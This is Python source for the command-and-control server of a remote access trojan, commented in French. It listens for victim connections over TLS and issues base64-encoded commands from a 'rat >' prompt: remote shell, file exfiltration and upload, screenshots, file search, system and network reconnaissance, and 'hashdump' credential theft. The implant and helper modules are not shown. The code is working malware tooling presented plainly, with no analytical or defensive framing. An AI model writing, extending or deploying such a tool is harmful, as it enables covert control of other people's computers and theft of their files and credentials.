import socket
import ssl
import threading
import base64
import os
import sys

# Ajout du répertoire parent au chemin système pour trouver les modules utilitaires
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Importation des modules utilitaires
from utils.shell import Shell
from utils.file_upload import FileUpload
from utils.file_download import FileDownload
from utils.screenshot import Screenshot
from utils.system_info import SystemInfo
from utils.network_info import NetworkInfo
from utils.file_search import FileSearch
from utils.command_help import CommandHelp

# Définition de l'hôte et du port du serveur
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 8888

# Liste des commandes disponibles
COMMANDS = [
    'help',
    'download <filepath>',
    'upload <filepath> <destination>',
    'shell <command>',
    'ipconfig',
    'screenshot',
    'search <filename>',
    'hashdump',
    'sysinfo',
    'exit',
    'quit'
]

def handle_client(client_socket, client_address):
    try:
        while True:
            # Lecture de la commande entrée par l'utilisateur
            cmd = input("rat > ").strip()
            # Envoi de la commande encodée au client
            client_socket.sendall(base64.b64encode(cmd.encode('utf-8')))
            if cmd.lower() in ('exit', 'quit'):
                break

            response = b''
            while True:
                # Réception de la réponse du client
                data = client_socket.recv(4096)
                if not data:
                    break
                response += data
                if len(data) < 4096:
                    break

            # Traitement des différentes commandes
            if cmd.startswith("download"):
                _, filepath = cmd.split(maxsplit=1)
                filename = os.path.basename(filepath)
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(response))
                print(f"Fichier enregistré sous {filename}")
            else:
                try:
                    decoded_response = base64.b64decode(response).decode('utf-8')
                    print(decoded_response)
                except UnicodeDecodeError:
                    with open("screenshot.png", "wb") as f:
                        f.write(base64.b64decode(response))
                    print("Capture d'écran enregistrée sous screenshot.png")
    except Exception as e:
        print(f"[-] Erreur : {str(e)}")
    finally:
        client_socket.close()

def main():
    # Création d'un contexte SSL avec le protocole TLS v1.3
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile="../certificate/server.crt", keyfile="../certificate/server.key")

    # Initialisation et lancement du serveur
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((SERVER_HOST, SERVER_PORT))
        server_socket.listen(1)
        print(f"[*] En écoute sur {SERVER_HOST}:{SERVER_PORT}")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"[+] Client connecté depuis {client_address}")
            client_socket = context.wrap_socket(client_socket, server_side=True)
            handle_client(client_socket, client_address)

if __name__ == "__main__":
    main()
